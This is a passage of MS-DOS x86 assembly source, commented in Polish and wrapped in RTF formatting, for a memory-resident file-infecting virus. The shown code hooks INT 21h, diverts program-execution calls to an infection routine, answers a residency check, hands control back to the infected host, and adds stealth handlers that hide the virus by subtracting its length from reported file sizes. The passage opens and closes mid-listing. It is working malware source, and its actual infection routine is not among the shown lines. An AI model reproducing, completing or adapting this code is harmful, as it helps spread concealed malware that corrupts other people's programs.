\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     mov   ax,25FFh                         ; funkcja DOS - ustaw adres INT 21}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     int   21h                              ; wywolaj funkcje}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     push  cs                               ; \\   wyswietl komunikat o}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     pop   ds                               ;  \\  instalacji w pamieci}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     lea   di,TeZainstalowany               ;   \\ i segment, w ktorym}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     Call  DrukSI                           ;   / rezyduje wirus}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     mov  ax,es                             ;  /}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     Call DrukHEX16                         ; /}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch PowrocDoNosiciela:                         ;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     push  cs cs                            ; \\ przywroc DS=ES=CS=PSP}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     pop   ds es                            ; /}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     mov   al,byte ptr [si][StareBajty]     ; \\  przywroc 3 poczatkowe bajty}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     mov   ds:[100h],al                     ;  \\ programu pod adresem CS:100h}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     mov   ax,word ptr [si][StareBajty+1]   ;  /}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     mov   ds:[101h],ax                     ; /}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     mov   ax,100h                          ; \\ zachowaj na stosie slad do}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     push  ax                               ; / adresu 100h}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     xor   ax,ax                            ; \\   dla bezpieczenstwa}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     xor   bx,bx                            ;  \\  lepiej wyzerowac rejestry}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     xor   cx,cx                            ;   \\ robocze}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     xor   dx,dx                            ;   /}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     xor   si,si                            ;  /}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     xor   di,di                            ; /}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     ret                                    ; powroc do nosiciela}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch PytanieOInstalacje:                        ; \\   odpowiedz rezydujacego}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     xchg  al,ah                            ;   - wirusa (na pytanie czy jest}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     iret                                   ; /   w pamieci)}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch NoweInt21:}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     cmp   ax,4B00h                         ; czy funkcja DOS - uruchom program ?}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     je    InfekcjaPliku                    ; TAK - sprobuj infekowac}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     cmp   ax,Haslo                         ; czy pytanie wirusa o instalacje ?}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     je    PytanieOInstalacje               ; TAK - odpowiedz, ze zainstalowany}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     cmp   ah,11h                           ; \\  czy funkcje przeszukiwania ?}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     je    STEALTH_11_12                    ;  \\ katalogu uzywane przez}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     cmp   ah,12h                           ;  / polecenie DIR ?}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     je    STEALTH_11_12                    ; /  TAK - oszukuj jesli trzeba}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     cmp   ah,4Eh                           ; \\  czy funkcje przeszukiwania ?}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     je    STEALTH_4E_4F                    ;  \\ katalogu uzywane przez}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     cmp   ah,4Fh                           ;  / nakladki ?}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     je    STEALTH_4E_4F                    ; /  TAK - oszukuj jesli trzeba}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     cmp   ah,3Dh}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     je    STEALTH_3D}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     jmp   PowrotZInt21                     ; idz do poprzedniego lancucha}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                            ; przerwan}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch STEALTH_3D:}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     call  UstawNowe24                      ; ustaw obsluge bledow krytycznych}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     Call  StareInt21                       ; wywolaj stare przerwanie 21h}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     jc    STEALTH_3D_Powrot2               ; CF=1 to blad}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     pushf                                  ; \\ zachowaj wartosci rejestrow}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     push  es ax bx di                      ; / zmienionych przez wywolanie}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     mov   bx,ax                            ; BX zawiera uchwyt (numer) pliku}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     mov   ax,1220h                         ; wez adres tablicy JFT}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     int   2Fh                              ; wywolaj funkcje}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     jc    STEALTH_3D_Powrot                ; CF=1 Blad}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     mov   bl,es:[di]                       ; wez numer tablicy SFT}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     mov   bh,0                             ; BX=BL}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     mov   ax,1216h                         ; wez adres tablicy SFT na podstawie numeru w BL}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     int   2Fh                              ; wywolaj funkcje}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     jc    STEALTH_3D_Powrot                ; CF=1 Blad}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     cmp   es:[di][SFTDate],VZnacznik       ; czy znaleziona pozycja jest}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                            ; zainfekowana ?}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     jne   STEALTH_3D_Powrot                ; NIE - STEALTH niepotrzebne}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     cmp   word ptr es:[di][SFTSize+2],0    ; czy dlugosc pliku >65535 ?}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     jne   MozeMiecWirusa_3D                ; TAK - moze byc zainfekowany}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     cmp   word ptr es:[di][SFTSize],DlugoscWirusa}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     jb    STEALTH_3D_Powrot                ; czy dlugosc pliku >=dlug. wirus}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                            ; TAK - moze byc zainfekowany}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                            ; NIE - STEALTH niepotrzebne}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch MozeMiecWirusa_3D:}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     sub   word ptr es:[di][SFTSize],DlugoscWirusa}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                            ; odejmij dlugosc wirusa}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     sbb   word ptr es:[di][SFTSize+2],0}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                            ; uwzglednij ewent. pozyczke}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                            ; z bardziej znaczacej czesci}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch STEALTH_3D_Powrot:}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     pop   di bx ax es                      ; \\ przywroc odpowiednie wartosci}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     popf                                   ; / rejestrow}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch STEALTH_3D_Powrot2:}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     Call  PrzywrocStare24                  ; przywroc stara obsluge bledow krytycznych}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     retf  2                                ; powrot z zachowaniem ustawionych znacznikow}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                            ; ES:DI wskazuje na tablic\uc1\u341\'e0 SFT pliku}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch STEALTH_11_12:}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     call  UstawNowe24                      ; ustaw obsluge bledow krytycznych}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     Call  StareInt21                       ; wywolaj stare przerwanie 21h}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     or    al,al                            ; CZY AL=0}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     jnz   STEALTH_11_12_Powrot2            ; AL<>0 to blad}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     pushf                                  ; \\ zachowaj wartosci rejestrow}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     push  es ax bx                         ; / zmienionych przez wywolanie}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     mov   ah,2Fh                           ; funkcja DOS - wez adres do DTA}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     Call  StareInt21                       ; wywolaj stare przerwanie 21h}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     cmp   es:[bx][DIRDrv],0FFh             ; czy rozszerzony FCB ?}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     jne   ZwyklyFCB                        ; NIE - zwykly FCB}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     add   bx,7                             ; dodaj przesuniecie}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                            ; teraz ES:BX=wskazuje na zwykly FCB}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ZwyklyFCB:}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     cmp   es:[bx][DIRDate],VZnacznik       ; czy znaleziona pozycja jest}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                            ; zainfekowana ?}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     jne   STEALTH_11_12_Powrot             ; NIE - STEALTH niepotrzebne}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     cmp   word ptr es:[bx][DTASize+2],0    ; czy dlugosc pliku >65535 ?}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     jne   MozeMiecWirusa_11_12             ; TAK - moze byc zainfekowany}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     cmp   word ptr es:[bx][DTASize],DlugoscWirusa}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     jb    STEALTH_11_12_Powrot             ; czy dlugosc pliku >= dlugosc wirusa}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                            ; TAK - moze miec wirusa}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                            ; NIE - STEALTH niepotrzebne}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch MozeMiecWirusa_11_12:}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     sub   word ptr es:[bx][DTASize],DlugoscWirusa}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                            ; odejmij dlugosc wirusa}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     sbb   word ptr es:[bx][DTASize+2],0}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                            ; uwzglednij ewent. pozyczke}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                            ; z bardziej znaczacej czesci}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch STEALTH_11_12_Powrot:}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     pop   bx ax es                         ; \\ przywroc odpowiednie wartosci}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     popf                                   ; / rejestrow}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch STEALTH_11_12_Powrot2:}{\f2\fs24\lang1045{\*\listtag0}\par}
